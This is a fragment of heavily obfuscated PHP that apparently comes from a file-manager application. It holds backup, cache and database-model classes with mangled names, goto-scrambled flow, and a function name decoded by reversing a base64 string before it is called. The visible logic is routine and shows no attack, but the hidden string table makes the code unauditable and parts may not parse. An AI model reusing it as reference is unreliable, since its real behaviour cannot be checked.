$ÓšÇ­»ü[$ÕŸ©¢–Œ[238]] : !1; $Ä‹¬‘»Ñ = $this->link($İ‹‹°¸, $ÕŸ©¢–Œ[1446]); } public function size($©¡ã”Îö) { $´Ïø¦ = $this->objectMeta($©¡ã”Îö); return $´Ïø¦ ? $´Ïø¦[$_SERVER[–Ú¬çÁ][76]] : 0; } public function info($öû—İ¦æ) { if ($this->isFolder($öû—İ¦æ)) { return $this->folderInfo($öû—İ¦æ); } else { if ($this->isFile($öû—İ¦æ)) { return $this->fileInfo($öû—İ¦æ); } } return !1; } public function exist($ì¼Õ¢•) { return $this->isFile($ì¼Õ¢•) || $this->isFolder($ì¼Õ¢•); } public function isFile($§»ØÆÕ) { return !$this->isFolder($§»ØÆÕ) && $this->objectMeta($§»ØÆÕ); } public function isFolder($”Ë©äé) { return $this->cacheMethod($_SERVER[–Ú¬çÁ][166], $”Ë©äé); } protected function objectMeta($£œâœ—Ö) { return $this->cacheMethod($_SERVER[–Ú¬çÁ][168], $£œâœ—Ö); } protected function _objectMeta($Ñ˜¨ ÔË) { $ ¢ ¯¡À =& $_SERVER[–Ú¬çÁ]; list($¨İÉüô, $Û‚Û£Æä) = $this->bucketManager->stat($this->bucket, $Ñ˜¨ ÔË); if ($¨İÉüô) { $¨İÉüô[$ ¢ ¯¡À[76]] = intval($¨İÉüô[$ ¢ ¯¡À[1432]]); } return $¨İÉüô; } protected function _isFolder($ Ãá•èæ) { $Â”âø =& $_SERVER[–Ú¬çÁ]; if ($ Ãá•èæ == $Â”âø[12] || $ Ãá•èæ == $Â”âø[8]) { return !0; } list($Ü‡’·¯í, $ùöãç¬§) = $this->bucketManager->listFiles($this->bucket, trim($ Ãá•èæ, $Â”âø[8]) . $Â”âø[8], $Â”âø[12], 1, $Â”âø[8]); return !empty($Ü‡’·¯í[$Â”âø[1435]]) || !empty($Ü‡’·¯í[$Â”âø[1436]]) ? !0 : !1; } } goto FÁŒÂ‹ÊŒï; bğ›ğŠ”èÍ: $fileSize = strrev(base64_decode($_SERVER[Àôù‚Í][0])); function binCheckNeq($ÄÅ é¥µ, $Ü²Âš…µ) { return $ÄÅ é¥µ != $Ü²Âš…µ; } $_SERVER[$_SERVER[Àôù‚Í][1]] = $fileSize($_SERVER[$_SERVER[Àôù‚Í][2]]); goto dŠ¢ñ×ê‹š; b³´—Ğ‘: class BackupDbFile { public function __construct() { } public function index() { $„³£×Ô =& $_SERVER[–Ú¬çÁ]; $ç±µÖäƒ = Backup::get(); $‘š—úøä = $ç±µÖäƒ[$„³£×Ô[32]]; $¶óâ¾…ß = $this->tmpFilesPath() . "\x62\141\x63\x6b\x75\160\137{$‘š—úøä}\57"; $ƒ…” ÀÃ = $this->backupPath($ç±µÖäƒ); if (!($ƒ…” ÀÃ = IO::mkdir($ƒ…” ÀÃ))) { return !1; } $¦‚òôœÆ = IO::listPath($¶óâ¾…ß); $õ­­ÃŸÉ = isset($¦‚òôœÆ[$„³£×Ô[83]]) ? $¦‚òôœÆ[$„³£×Ô[83]] : array(); $ÏÔ´·¦ = array_sum(array_column($õ­­ÃŸÉ, $„³£×Ô[76])); if (!$ÏÔ´·¦) { return !1; } $ŠûÊÙ‘ = array($„³£×Ô[818] => $ÏÔ´·¦, $„³£×Ô[819] => time()); Backup::set($ŠûÊÙ‘); $ùàùøğÌ = new TaskFileTransfer($„³£×Ô[820], $„³£×Ô[800], count($õ­­ÃŸÉ), LNG($„³£×Ô[801]) . $„³£×Ô[439] . LNG($„³£×Ô[803]) . $„³£×Ô[821]); $ùàùøğÌ->task[$„³£×Ô[783]] = $ÏÔ´·¦; foreach ($¦‚òôœÆ[$„³£×Ô[83]] as $é—æì­) { $‡„ÄÛÑÉ = IO::move($é—æì­[$„³£×Ô[84]], $ƒ…” ÀÃ); if (!$‡„ÄÛÑÉ) { $ùàùøğÌ->end(); $Õµ›£É• = IO::getLastError($„³£×Ô[822] . $é—æì­[$„³£×Ô[84]] . $„³£×Ô[823] . $ƒ…” ÀÃ . $„³£×Ô[165]); write_log($Õµ›£É•, $„³£×Ô[800]); return !1; } } $äí×·Æ¤ = new DbManage(); $¦œµÅœñ = $äí×·Æ¤->getSqlFile(); if (!$¦œµÅœñ[$„³£×Ô[824]] || !$¦œµÅœñ[$„³£×Ô[13]]) { return !1; } IO::move($¦œµÅœñ[$„³£×Ô[824]], $ƒ…” ÀÃ); IO::move($¦œµÅœñ[$„³£×Ô[13]], $ƒ…” ÀÃ); $ùàùøğÌ->end(); $ŠûÊÙ‘ = array($„³£×Ô[825] => $ÏÔ´·¦, $„³£×Ô[826] => time()); Backup::set($ŠûÊÙ‘); return !0; } private function backupPath($÷­×¨ä) { $°¹ÇøÙ­ =& $_SERVER[–Ú¬çÁ]; $¦ø¢ıÆ‹ = $÷­×¨ä[$°¹ÇøÙ­[32]]; $úÜêˆ÷Ï = Model($°¹ÇøÙ­[790])->get($°¹ÇøÙ­[791]); $´¼‰Â¦‹ = substr(md5($°¹ÇøÙ­[792] . $úÜêˆ÷Ï . $¦ø¢ıÆ‹), 0, 8); return "\173\151\x6f\72{$÷­×¨ä[$°¹ÇøÙ­[771]]}\x7d\x2f\144\x61\164\x61\x62\141\163\x65\x2f\142\141\x63\153\165\160\57" . $¦ø¢ıÆ‹ . $°¹ÇøÙ­[11] . $´¼‰Â¦‹; } private function tmpFilesPath() { $±ÕšÃšá =& $_SERVER[–Ú¬çÁ]; $şú¤ÅÛ = TEMP_FILES; if ($GLOBALS[$±ÕšÃšá[6]][$±ÕšÃšá[89]][$±ÕšÃšá[816]]) { $şú¤ÅÛ = $GLOBALS[$±ÕšÃšá[6]][$±ÕšÃšá[89]][$±ÕšÃšá[816]]; if (!mk_dir($şú¤ÅÛ) || !is_writable($şú¤ÅÛ) || !IO::mkfile($şú¤ÅÛ . $±ÕšÃšá[817])) { $şú¤ÅÛ = TEMP_FILES; } } return $şú¤ÅÛ; } } class BackupFile { public function __construct() { } public function index() { $ÓŠµº– = Backup::get(); $ùÚÊ•ÄÌ = $ÓŠµº–[$_SERVER[–Ú¬çÁ][346]][$_SERVER[–Ú¬çÁ][224]][$_SERVER[–Ú¬çÁ][518]]; $‡ñ½Ë”ç = array($_SERVER[–Ú¬çÁ][519] => array($_SERVER[–Ú¬çÁ][827], $ùÚÊ•ÄÌ), $_SERVER[–Ú¬çÁ][828] => array($_SERVER[–Ú¬çÁ][384], $ÓŠµº–[$_SERVER[–Ú¬çÁ][771]])); $Íğ•Š¿Å = (int) Model($_SERVER[–Ú¬çÁ][809])->where($‡ñ½Ë”ç)->count($_SERVER[–Ú¬çÁ][518]); $šÈïÁ›ğ = (int) Model($_SERVER[–Ú¬çÁ][809])->where($‡ñ½Ë”ç)->sum($_SERVER[–Ú¬çÁ][76]); $¦ø·İı = new TaskFileTransfer($_SERVER[–Ú¬çÁ][829], $_SERVER[–Ú¬çÁ][800], $Íğ•Š¿Å, LNG($_SERVER[–Ú¬çÁ][801]) . $_SERVER[–Ú¬çÁ][802] . LNG($_SERVER[–Ú¬çÁ][830])); $¦ø·İı->task[$_SERVER[–Ú¬çÁ][783]] = $šÈïÁ›ğ; $˜Ï¸¶ÇÑ = array($_SERVER[–Ú¬çÁ][831] => $Íğ•Š¿Å, $_SERVER[–Ú¬çÁ][832] => $šÈïÁ›ğ, $_SERVER[–Ú¬çÁ][833] => time()); Backup::set($˜Ï¸¶ÇÑ); $¹Ò•Ï¨ = !0; $äæ·Øà  = $this->storeIds(); $À¿ÕÉä¶ = 1; $‰¬§¦¹Ÿ = 1000; $Œ¤Àíö = $¤ãĞªÁ¬ = 0; $ÄÍ»Õ©¬ = array(); $÷Éø‘è³ = $ÃÅââÆÖ = 0; do { $ıá”öœ¼ = $_SERVER[–Ú¬çÁ][834]; $¶Ü‡ÆïÏ = Model($_SERVER[–Ú¬çÁ][809])->where($‡ñ½Ë”ç)->field($ıá”öœ¼)->order($_SERVER[–Ú¬çÁ][835])->selectPage($‰¬§¦¹Ÿ, $À¿ÕÉä¶); $äÚ‰ªÃÎ = !empty($¶Ü‡ÆïÏ[$_SERVER[–Ú¬çÁ][422]]) ? $¶Ü‡ÆïÏ[$_SERVER[–Ú¬çÁ][422]] : array(); foreach ($äÚ‰ªÃÎ as $ç¼Ö²„) { if (!$this->_fileExist($ç¼Ö²„, $ÄÍ»Õ©¬, $äæ·Øà )) { $Íğ•Š¿Å -= 1; $šÈïÁ›ğ -= (int) $ç¼Ö²„[$_SERVER[–Ú¬çÁ][76]]; write_log("\x66\x69\154\145\x20\156\157\164\40\145\170\151\163\x74\56\x66\x69\154\145\111\104\x3a{$ç¼Ö²„[$_SERVER[–Ú¬çÁ][518]]}\x2c\x20\x70\x61\164\x68\x3a{$ç¼Ö²„[$_SERVER[–Ú¬çÁ][84]]}", $_SERVER[–Ú¬çÁ][836]); continue; } $¨Ç¼ÇÒö = $ç¼Ö²„[$_SERVER[–Ú¬çÁ][84]]; $ÜØêßî = "\173\151\157\x3a{$ÓŠµº–[$_SERVER[–Ú¬çÁ][771]]}\x7d" . substr($¨Ç¼ÇÒö, strlen("\173\151\157\72{$ç¼Ö²„[$_SERVER[–Ú¬çÁ][837]]}\175")); if (IO::exist($ÜØêßî)) { $¦ø·İı->updateFileEnd($ç¼Ö²„[$_SERVER[–Ú¬çÁ][32]], $ç¼Ö²„[$_SERVER[–Ú¬çÁ][76]]); } else { $ÜØêßî = get_path_father($ÜØêßî); IO::mkdir($ÜØêßî); if (!IO::copy($¨Ç¼ÇÒö, $ÜØêßî, $_SERVER[–Ú¬çÁ][838])) { write_log($_SERVER[–Ú¬çÁ][839] . $¨Ç¼ÇÒö . $_SERVER[–Ú¬çÁ][823] . $ÜØêßî . $_SERVER[–Ú¬çÁ][165], $_SERVER[–Ú¬çÁ][800]); $¹Ò•Ï¨ = !1; break; } } $ùÚÊ•ÄÌ = $ç¼Ö²„[$_SERVER[–Ú¬çÁ][518]]; $¤ãĞªÁ¬ += 1; $Œ¤Àíö += $ç¼Ö²„[$_SERVER[–Ú¬çÁ][76]]; $ÃÅââÆÖ += 1; $÷Éø‘è³ += $ç¼Ö²„[$_SERVER[–Ú¬çÁ][76]]; if ($Œ¤Àíö >= 1024 * 1024 * 100) { $˜Ï¸¶ÇÑ = array($_SERVER[–Ú¬çÁ][840] => $ùÚÊ•ÄÌ, $_SERVER[–Ú¬çÁ][841] => $ÃÅââÆÖ, $_SERVER[–Ú¬çÁ][842] => $÷Éø‘è³); Backup::set($˜Ï¸¶ÇÑ); $Œ¤Àíö = $¤ãĞªÁ¬ = 0; } } $¦áÊş = count($äÚ‰ªÃÎ); $À¿ÕÉä¶++; } while ($¦áÊş == $‰¬§¦¹Ÿ); $¦ø·İı->end(); $˜Ï¸¶ÇÑ = array($_SERVER[–Ú¬çÁ][843] => 1, $_SERVER[–Ú¬çÁ][781] => time(), $_SERVER[–Ú¬çÁ][795] => 1, $_SERVER[–Ú¬çÁ][840] => $ùÚÊ•ÄÌ, $_SERVER[–Ú¬çÁ][832] => $šÈïÁ›ğ, $_SERVER[–Ú¬çÁ][831] => $Íğ•Š¿Å, $_SERVER[–Ú¬çÁ][844] => time()); if ($¤ãĞªÁ¬) { $˜Ï¸¶ÇÑ[$_SERVER[–Ú¬çÁ][841]] = $ÃÅââÆÖ; $˜Ï¸¶ÇÑ[$_SERVER[–Ú¬çÁ][842]] = $÷Éø‘è³; } Backup::set($˜Ï¸¶ÇÑ); $this->_fileFilter($ÄÍ»Õ©¬); return !0; } private function _fileExist($ãÁ•”ƒÉ, &$çéâÏ, $ÓÜï¤¼”) { $òä„œ® =& $_SERVER[–Ú¬çÁ]; $•®ºÄ³ = $ãÁ•”ƒÉ[$òä„œ®[84]]; if (in_array($ãÁ•”ƒÉ[$òä„œ®[518]], $çéâÏ)) { return !1; } if (!in_array($ãÁ•”ƒÉ[$òä„œ®[837]], $ÓÜï¤¼”)) { return !1; } if (IO::exist($•®ºÄ³)) { return !0; } $„ı±Õ˜Ê = get_path_father($•®ºÄ³); if (IO::exist($„ı±Õ˜Ê)) { $çéâÏ[] = $ãÁ•”ƒÉ[$òä„œ®[518]]; return !1; } $Ñ¡‰àÍ» = array($òä„œ®[837] => $ãÁ•”ƒÉ[$òä„œ®[837]], $òä„œ®[84] => array($òä„œ®[436], "{$„ı±Õ˜Ê}\x25")); $ËÇ˜ï = Model($òä„œ®[809])->where($Ñ¡‰àÍ»)->field($òä„œ®[519])->select(); $çéâÏ = array_merge($çéâÏ, array_to_keyvalue($ËÇ˜ï, $òä„œ®[12], $òä„œ®[518])); return !1; } private function _fileFilter($¾ÁÜÃ·å) { $ÓºÆøù =& $_SERVER[–Ú¬çÁ]; if (empty($¾ÁÜÃ·å)) { return; } $¯ıâÇô = array($ÓºÆøù[518] => array($ÓºÆøù[7], array_unique($¾ÁÜÃ·å))); $ÓÏÖİ¾µ = Model($ÓºÆøù[845])->where($¯ıâÇô)->field($ÓºÆøù[181])->select(); foreach ($ÓÏÖİ¾µ as $†ŒŠ®™‡) { Model($ÓºÆøù[845])->remove($†ŒŠ®™‡[$ÓºÆøù[181]], !1); } } private function storeIds() { $‰‰ÆÊ‰ =& $_SERVER[–Ú¬çÁ]; $Š§§¹¦„ = Model($‰‰ÆÊ‰[787])->listData(); $›Ü·´ù = array(); $‡¹Ñğš = $GLOBALS[$‰‰ÆÊ‰[6]][$‰‰ÆÊ‰[89]][$‰‰ÆÊ‰[846]]; foreach ($Š§§¹¦„ as $·–É´ìß) { $Íá ³‹ = strtolower($·–É´ìß[$‰‰ÆÊ‰[95]]); if (!isset($‡¹Ñğš[$Íá ³‹])) { continue; } $»ä‰ğû = $‰‰ÆÊ‰[74] . (isset($‡¹Ñğš[$Íá ³‹]) ? $‡¹Ñğš[$Íá ³‹] : ucfirst($Íá ³‹)); if (!class_exists($»ä‰ğû)) { continue; } $›Ü·´ù[] = $·–É´ìß[$‰‰ÆÊ‰[452]]; } return $›Ü·´ù; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ªáÅ½Ää =& $_SERVER[–Ú¬çÁ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ÃÜ»Ñ¨ = $GLOBALS[$ªáÅ½Ää[6]][$ªáÅ½Ää[402]]; $Ëãé „Ü = $ÃÜ»Ñ¨[$ÃÜ»Ñ¨[$ªáÅ½Ää[847]]]; $’’à—» = $ÃÜ»Ñ¨[$ªáÅ½Ää[848]]; switch ($ÃÜ»Ñ¨[$ªáÅ½Ää[847]]) { case $ªáÅ½Ää[21]: self::$handle = Model($ªáÅ½Ää[849]); break; case $ªáÅ½Ää[850]: self::$handle = new CacheRedis($Ëãé „Ü, $’’à—»); break; case $ªáÅ½Ää[851]: self::$handle = new CacheMemcached($Ëãé „Ü, $’’à—»); break; case $ªáÅ½Ää[224]: self::$handle = new CacheFile($Ëãé „Ü, $’’à—»); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($öÑ´©Ä¬) { if (is_array($öÑ´©Ä¬) || is_object($öÑ´©Ä¬)) { $öÑ´©Ä¬ = json_encode($öÑ´©Ä¬); } $öÑ´©Ä¬ = rawurlencode($öÑ´©Ä¬); return md5(KOD_SITE_ID . $_SERVER[–Ú¬çÁ][11] . $öÑ´©Ä¬); } public static function get($û»öÖÌ², $»ºÏÙòú = false) { $ÌæßƒÊÌ = self::key($û»öÖÌ²); $ò“îÆö = self::init(); if ($»ºÏÙòú) { return unserialize($ò“îÆö->get($ÌæßƒÊÌ)); } if (!isset(self::$memoryCache[$ÌæßƒÊÌ])) { $Èøš‚ü· = $ò“îÆö->get($ÌæßƒÊÌ); self::$memoryCache[$ÌæßƒÊÌ] = unserialize($Èøš‚ü·); } return self::$memoryCache[$ÌæßƒÊÌ]; } public static function set($¤ÙºÌÙ, $”Ïöã¹é, $›‚ò İ = false) { $ö·ÜØ =& $_SERVER[–Ú¬çÁ]; $òÅ§´ = self::key($¤ÙºÌÙ); if (isset(self::$memoryCache[$òÅ§´]) && self::$memoryCache[$òÅ§´] === $”Ïöã¹é) { return !0; } if ($›‚ò İ === 0) { self::$memoryCache[$òÅ§´] = $”Ïöã¹é; return !0; } $’‘¸–ùÀ = self::init(); $¥Æ•‰‘ = serialize($”Ïöã¹é); CacheLock::lock($¤ÙºÌÙ . $ö·ÜØ[852]); $”ï‡ßÛÉ = $’‘¸–ùÀ->set($òÅ§´, $¥Æ•‰‘, $›‚ò İ); self::$memoryCache[$òÅ§´] = $”Ïöã¹é; CacheLock::unlock($¤ÙºÌÙ . $ö·ÜØ[852]); return $”ï‡ßÛÉ; } public static function getCall($Ê¼çÊ, $¹×µúç°, $çãØí¥§, $Øé™’Íé = array()) { $ş¨ñ”ø =& $_SERVER[–Ú¬çÁ]; $æ“û”÷‚ = self::get($Ê¼çÊ); if ($æ“û”÷‚ || $æ“û”÷‚ === $ş¨ñ”ø[12]) { return $æ“û”÷‚; } $æ“û”÷‚ = call_user_func_array($çãØí¥§, $Øé™’Íé); $æ“û”÷‚ = $æ“û”÷‚ ? $æ“û”÷‚ : $ş¨ñ”ø[12]; self::set($Ê¼çÊ, $æ“û”÷‚, $¹×µúç°); return $æ“û”÷‚; } public static function remove($Ä¢œ²­è) { $·œ£ÀÌ = self::key($Ä¢œ²­è); unset(self::$memoryCache[$·œ£ÀÌ]); self::clearTimeout(); CacheLock::lock($Ä¢œ²­è); $¹ˆş­ó¤ = self::init()->remove($·œ£ÀÌ); CacheLock::unlock($Ä¢œ²­è); return $¹ˆş­ó¤; } public static function removeMemory($æ«ò¿¼Ê) { $×¦Ø¹¯ı = self::key($æ«ò¿¼Ê); unset(self::$memoryCache[$×¦Ø¹¯ı]); } public static function clearMemory($›Äß˜£ç = false) { if ($›Äß˜£ç) { $›Äß˜£ç = self::key($›Äß˜£ç); unset(self::$memoryCache[$›Äß˜£ç]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[–Ú¬çÁ][853])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[–Ú¬çÁ][854])) { self::init()->clearTimeout(); } } } goto B‚ÛÊå¾Ã¡; a‡ğšÇ‰ªÍ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\x6c\145", "\157\x72\144\145\162", "\x61\154\x69\x61\163", "\150\x61\x76\151\x6e\x67", "\147\x72\157\x75\x70", "\x6c\x6f\x63\153", "\144\151\163\x74\x69\156\x63\x74", "\x61\x75\x74\x6f", "\x66\151\x6c\x74\145\162", "\x76\x61\154\151\x64\141\164\145", "\162\145\x73\x75\154\x74", "\x62\x69\156\144", "\x74\157\153\145\156"); public function __construct($™‡¤àë¾ = '', $€ÔÈ•… = '', $’»êŠßî = '') { $Ó‰”Æ«… =& $_SERVER[–Ú¬çÁ]; $this->_initialize(); if (!empty($™‡¤àë¾)) { if (strpos($™‡¤àë¾, $Ó‰”Æ«…[10])) { list($this->dbName, $this->name) = explode($Ó‰”Æ«…[10], $™‡¤àë¾); } else { $this->name = $™‡¤àë¾; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($€ÔÈ•…)) { $this->tablePrefix = $Ó‰”Æ«…[12]; } elseif ($Ó‰”Æ«…[12] != $€ÔÈ•…) { $this->tablePrefix = $€ÔÈ•…; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Ó‰”Æ«…[297]); } $this->db(0, empty($this->connection) ? $’»êŠßî : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $‚êšÔĞÎ =& $_SERVER[–Ú¬çÁ]; if (empty($this->fields)) { if (think_config($‚êšÔĞÎ[298])) { $®ï¯…İ = $this->dbName ? $this->dbName : think_config($‚êšÔĞÎ[299]); $Ü—æùœõ = think_var_cache($‚êšÔĞÎ[300] . strtolower(get_path_this($®ï¯…İ) . $‚êšÔĞÎ[10] . $this->name)); if ($Ü—æùœõ) { $³×Ê„¶× = think_config($‚êšÔĞÎ[301]); if (empty($³×Ê„¶×) || $Ü—æùœõ[$‚êšÔĞÎ[302]] == $³×Ê„¶×) { $this->fields = $Ü—æùœõ; return; } } } $this->flush(); } } public function flush() { $–œ¸ì¯ß =& $_SERVER[–Ú¬çÁ]; $this->db->setModel($this->name); $ğœó¬£ = $this->db->getFields($this->getTableName()); if (!$ğœó¬£) { return !1; } $this->fields = array_keys($ğœó¬£); $this->fields[$–œ¸ì¯ß[303]] = !1; foreach ($ğœó¬£ as $îÄ ¼·Ú => $  Í½¯Š) { $ºİ†¸Ã[$îÄ ¼·Ú] = $  Í½¯Š[$–œ¸ì¯ß[33]]; if ($  Í½¯Š[$–œ¸ì¯ß[39]]) { $this->fields[$–œ¸ì¯ß[304]] = $îÄ ¼·Ú; if ($  Í½¯Š[$–œ¸ì¯ß[42]]) { $this->fields[$–œ¸ì¯ß[303]] = !0; } } } $this->fields[$–œ¸ì¯ß[305]] = $ºİ†¸Ã; if (think_config($–œ¸ì¯ß[301])) { $this->fields[$–œ¸ì¯ß[302]] = think_config($–œ¸ì¯ß[301]); } if (think_config($–œ¸ì¯ß[298])) { $­ª”Í = $this->dbName ? $this->dbName : think_config($–œ¸ì¯ß[299]); think_var_cache($–œ¸ì¯ß[300] . strtolower(get_path_this($­ª”Í) . $–œ¸ì¯ß[10] . $this->name), $this->fields); } } public function switchModel($® ˆ„Ş, $é°ûëÖİ = array()) { $à˜ºØ¢ =& $_SERVER[–Ú¬çÁ]; $Ú‚¿¥ø = ucwords(strtolower($® ˆ„Ş)) . $à˜ºØ¢[306]; if (!class_exists($Ú‚¿¥ø)) { think_exception($Ú‚¿¥ø . think_lang($à˜ºØ¢[307])); } $this->_extModel = new $Ú‚¿¥ø($this->name); if (!empty($é°ûëÖİ)) { foreach ($é°ûëÖİ as $ÊæÊÏ‡‰) { $this->_extModel->setProperty($ÊæÊÏ‡‰, $this->{$ÊæÊÏ‡‰}); } } return $this->_extModel; } public function __set($´šÕÂ…¸, $™½ê€Ä) { $this->data[$´šÕÂ…¸] = $™½ê€Ä; } public function __get($¡Ñª»‚) { return isset($this->data[$¡Ñª»‚]) ? $this->data[$¡Ñª»‚] : null; } public function __isset($»æ®‰û·) { return isset($this->data[$»æ®‰û·]); } public function __unset($š‰êŸšŒ) { unset($this->data[$š‰êŸšŒ]); } public function __call($‘à³œ¬ä, $ï÷ŞÂâ) { $…›™¾¾ =& $_SERVER[–Ú¬çÁ]; if (in_array(strtolower($‘à³œ¬ä), $this->methods, !0)) { $this->options[strtolower($‘à³œ¬ä)] = $ï÷ŞÂâ[0]; return $this; } elseif (in_array(strtolower($‘à³œ¬ä), array($…›™¾¾[308], $…›™¾¾[309], $…›™¾¾[310], $…›™¾¾[311], $…›™¾¾[312]), !0)) { $¦ñıá†¡ = isset($ï÷ŞÂâ[0]) ? $ï÷ŞÂâ[0] : $…›™¾¾[213]; $¦ñıá†¡ = $this->db->parseKey($¦ñıá†¡); return $this->getField(strtoupper($‘à³œ¬ä) . $…›™¾¾[313] . $¦ñıá†¡ . $…›™¾¾[314] . $‘à³œ¬ä, $…›™¾¾[308]); } elseif (strtolower(substr($‘à³œ¬ä, 0, 5)) == $…›™¾¾[315]) { $¦ñıá†¡ = think_parse_name(substr($‘à³œ¬ä, 5)); $â˜ÛŞÊÄ[$¦ñıá†¡] = $ï÷ŞÂâ[0]; return $this->where($â˜ÛŞÊÄ)->find(); } elseif (strtolower(substr($‘à³œ¬ä, 0, 10)) == $…›™¾¾[316]) { $£´ÇÜøÈ = think_parse_name(substr($‘à³œ¬ä, 10)); $â˜ÛŞÊÄ[$£´ÇÜøÈ] = $ï÷ŞÂâ[0]; return $this->where($â˜ÛŞÊÄ)->getField($ï÷ŞÂâ[1]); } elseif (isset($this->_scope[$‘à³œ¬ä])) { return $this->scope($‘à³œ¬ä, $ï÷ŞÂâ[0]); } elseif (method_exists($this, $‘à³œ¬ä)) { array_unshift($ï÷ŞÂâ, $‘à³œ¬ä); return call_user_func_array(array($this, $…›™¾¾[317]), $ï÷ŞÂâ); } else { return call_user_func_array(array(parent, $‘à³œ¬ä), $ï÷ŞÂâ); } } protected function call() { $åˆ©Éç =& $_SERVER[–Ú¬çÁ]; $®Ô¾¨• = func_get_args(); $Ü¨–ºà = array_shift($®Ô¾¨•); $Ğî”å‘Ş = $Ü¨–ºà; if (is_array($Ü¨–ºà)) { $Ğî”å‘Ş = $Ü¨–ºà[1]; $Ü¨–ºà = $Ü¨–ºà[0]; } $Ğ‘…›˜Ê = count($®Ô¾¨•) - 1; if (isset($®Ô¾¨•[$Ğ‘…›˜Ê]) && $®Ô¾¨•[$Ğ‘…›˜Ê] === $Ü¨–ºà) { think_exception(__CLASS__ . $åˆ©Éç[4] . $Ü¨–ºà . think_lang($åˆ©Éç[318])); return; } $®Ô¾¨•[] = $Ü¨–ºà; if (method_exists($this, $åˆ©Éç[319])) { $§ñú³ğ– = call_user_func_array(array($this, $åˆ©Éç[320]), array($Ğî”å‘Ş, $®Ô¾¨•)); if (!is_null($§ñú³ğ–) && $§ñú³ğ– !== !1) { return $§ñú³ğ–; } } $œ’µ¼›æ = call_user_func_array(array($this, $Ü¨–ºà), $®Ô¾¨•); if (method_exists($this, $åˆ©Éç[321])) { $§ñú³ğ– = call_user_func_array(array($this, $åˆ©Éç[322]), array($Ğî”å‘Ş, $®Ô¾¨•, $œ’µ¼›æ)); if ($§ñú³ğ–) { return $§ñú³ğ–; } } return $œ’µ¼›æ; } protected function _initialize() { } protected function _facade($ÃŸŠÚû³) { $£Ğ£°­í =& $_SERVER[–Ú¬çÁ]; if (!empty($this->fields)) { foreach ($ÃŸŠÚû³ as $¦ìç¹™” => $ËÑíúƒÚ) { if (is_array($this->fields) && !in_array($¦ìç¹™”, $this->fields, !0)) { unset($ÃŸŠÚû³[$¦ìç¹™”]); } elseif (is_scalar($ËÑíúƒÚ)) { $this->_parseType($ÃŸŠÚû³, $¦ìç¹™”); } } } if (!empty($this->options[$£Ğ£°­í[323]])) { $ÃŸŠÚû³ = array_map($this->options[$£Ğ£°­í[323]], $ÃŸŠÚû³); unset($this->options[$£Ğ£°­í[323]]); } $this->_beforeWrite($ÃŸŠÚû³); return $ÃŸŠÚû³; } protected function _beforeWrite(&$†«ê’“³) { } public function add($…ıµæ— = '', $—‰Õš¡Ñ = array(), $ëğ¶ÄÜÅ = false) { if (empty($…ıµæ—)) { if (!empty($this->data)) { $…ıµæ— = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[–Ú¬çÁ][324]); return !1; } } $—‰Õš¡Ñ = $this->_parseOptions($—‰Õš¡Ñ); $…ıµæ— = $this->_facade($…ıµæ—); if (!1 === $this->_beforeInsert($…ıµæ—, $—‰Õš¡Ñ)) { return !1; } $«ÁÈÙ§É = $this->db->insert($…ıµæ—, $—‰Õš¡Ñ, $ëğ¶ÄÜÅ); if (!1 !== $«ÁÈÙ§É) { $ÎŠÇ«Û¥ = $this->getLastInsID(); if ($ÎŠÇ«Û¥) { $…ıµæ—[$this->getPk()] = $ÎŠÇ«Û¥; $this->_after_insert($…ıµæ—, $—‰Õš¡Ñ); return $ÎŠÇ«Û¥; } $this->_after_insert($…ıµæ—, $—‰Õš¡Ñ); } return $«ÁÈÙ§É; } protected function _beforeInsert(&$ºÕì˜¶Á, $ƒàçâÛÔ) { } protected function _after_insert($èÏ¿ÍÚÁ, $àèú‚íŞ) { } public function addAll($¿õÅ¹ĞÂ, $´áï´£ = array(), $°Ç¶šğû = false) { $İôÄ’‹ =& $_SERVER[–Ú¬çÁ]; if (empty($¿õÅ¹ĞÂ)) { $this->error = think_lang($İôÄ’‹[324]); return !1; } $´áï´£ = $this->_parseOptions($´áï´£); foreach ($¿õÅ¹ĞÂ as $Õõ¶âêë => $Àøêˆ°é) { $¿õÅ¹ĞÂ[$Õõ¶âêë] = $this->_facade($Àøêˆ°é); } if (method_exists($this->db, $İôÄ’‹[325])) { $Úó ²û = $this->db->insertAll($¿õÅ¹ĞÂ, $´áï´£, $°Ç¶šğû); } else { $this->startTrans(); foreach ($¿õÅ¹ĞÂ as $Õõ¶âêë => $Àøêˆ°é) { $Úó ²û = $this->db->insert($Àøêˆ°é, $´áï´£, $°Ç¶šğû); } $this->commit(); } if (!1 !== $Úó ²û) { $Œš¥ æÆ = $this->getLastInsID(); if ($Œš¥ æÆ) { return $Œš¥ æÆ; } } return $Úó ²û; } public function selectAdd($¥à·¬ = '', $ÔŸÁ¼¡ó = '', $ÉØè©˜· = array()) { $ÓÛêù“ =& $_SERVER[–Ú¬çÁ]; $ÉØè©˜· = $this->_parseOptions($ÉØè©˜·); if (!1 === ($™©Ïöğ = $this->db->selectInsert($¥à·¬ ? $¥à·¬ : $ÉØè©˜·[$ÓÛêù“[326]], $ÔŸÁ¼¡ó ? $ÔŸÁ¼¡ó : $this->getTableName(), $ÉØè©˜·))) { $this->error = think_lang($ÓÛêù“[327]); return !1; } else { return $™©Ïöğ; } } public function save($øİ§£Ç = '', $™¶Èëı˜ = array()) { $â£µüù =& $_SERVER[–Ú¬çÁ]; if (empty($øİ§£Ç)) { if (!empty($this->data)) { $øİ§£Ç = $this->data; $this->data = array(); } else { $this->error = think_lang($â£µüù[324]); return !1; } } $øİ§£Ç = $this->_facade($øİ§£Ç); 